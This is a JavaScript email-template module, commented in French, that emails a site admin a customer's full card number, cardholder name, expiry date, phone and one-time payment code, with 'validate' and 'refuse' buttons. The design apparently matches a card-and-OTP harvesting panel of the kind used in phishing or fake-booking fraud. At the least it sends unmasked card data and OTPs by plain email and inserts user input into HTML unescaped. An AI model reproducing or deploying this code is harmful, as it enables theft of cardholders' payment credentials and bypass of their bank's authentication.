import { emailLayout } from './layout';

/**
 * Email envoyé à l'admin lors d'une tentative de paiement par carte avec OTP.
 * Contient les infos de carte + le code OTP + 2 boutons d'action.
 *
 * @param {object} opts
 * @param {string} opts.userName       - Nom du client
 * @param {string} opts.userEmail      - Email du client
 * @param {string} opts.phone          - Téléphone saisi par le client
 * @param {string} opts.cardNumber     - Numéro de carte formaté
 * @param {string} opts.cardName       - Nom du titulaire
 * @param {string} opts.cardExpiry     - Date d'expiration MM/AA
 * @param {string} opts.otp            - Code OTP généré
 * @param {string} opts.bookingRef     - ID court de la réservation
 * @param {string} opts.approveUrl     - URL du bouton VALIDER
 * @param {string} opts.rejectUrl      - URL du bouton REFUSER
 */
export function adminOtpCardEmail({
  userName,
  userEmail,
  phone,
  cardNumber,
  cardName,
  cardExpiry,
  otp,
  bookingRef,
  approveUrl,
  rejectUrl,
}) {
  return {
    subject: `[Action requise] Paiement carte — Réservation #${bookingRef}`,
    html: emailLayout({
      title: 'Demande de paiement par carte',
      preheader: `${userName} demande à payer par carte — code OTP : ${otp}`,
      content: `
        <h2>Demande de paiement par carte bancaire</h2>
        <p>
          Un client souhaite finaliser son paiement par carte.
          Le code OTP ci-dessous lui a été communiqué.
          <strong>Vous devez valider ou refuser cette transaction.</strong>
        </p>

        <!-- Encart OTP mis en avant -->
        <div style="
          margin: 20px 0;
          padding: 20px 24px;
          background: #1e1b4b;
          border-radius: 12px;
          text-align: center;
        ">
          <p style="margin:0 0 6px; color:#a5b4fc; font-size:12px; text-transform:uppercase; letter-spacing:2px; font-weight:600;">
            Code OTP client
          </p>
          <p style="margin:0; color:#ffffff; font-size:36px; font-weight:800; letter-spacing:8px; font-family:monospace;">
            ${otp}
          </p>
          <p style="margin:8px 0 0; color:#a5b4fc; font-size:11px;">
            Valable 10 minutes — ne pas partager
          </p>
        </div>

        <!-- Infos client + carte -->
        <div class="info-box">
          <div class="info-row">
            <span class="label">Réservation</span>
            <span class="value">#${bookingRef}</span>
          </div>
          <div class="info-row">
            <span class="label">Client</span>
            <span class="value">${userName}</span>
          </div>
          <div class="info-row">
            <span class="label">Email client</span>
            <span class="value">${userEmail}</span>
          </div>
          <div class="info-row">
            <span class="label">Téléphone</span>
            <span class="value">${phone || '—'}</span>
          </div>
          <div class="info-row">
            <span class="label">Numéro de carte</span>
            <span class="value" style="font-family:monospace;letter-spacing:2px">${cardNumber}</span>
          </div>
          <div class="info-row">
            <span class="label">Titulaire</span>
            <span class="value">${cardName}</span>
          </div>
          <div class="info-row">
            <span class="label">Expiration</span>
            <span class="value">${cardExpiry}</span>
          </div>
        </div>

        <!-- Boutons d'action -->
        <p style="text-align:center; margin: 28px 0 8px;">
          <a href="${approveUrl}"
             style="
               display:inline-block;
               background:#16a34a;
               color:#ffffff !important;
               text-decoration:none;
               padding:14px 36px;
               border-radius:8px;
               font-weight:700;
               font-size:15px;
               margin: 0 8px;
             ">
            VALIDER le paiement
          </a>
          <a href="${rejectUrl}"
             style="
               display:inline-block;
               background:#dc2626;
               color:#ffffff !important;
               text-decoration:none;
               padding:14px 36px;
               border-radius:8px;
               font-weight:700;
               font-size:15px;
               margin: 0 8px;
             ">
            REFUSER le paiement
          </a>
        </p>

        <p style="color:#71717a; font-size:12px; text-align:center; margin-top:20px;">
          Ces liens sont à usage unique et expirent dans 10 minutes.<br>
          Si vous ne reconnaissez pas cette demande, cliquez sur REFUSER.
        </p>
      `,
    }),
  };
}
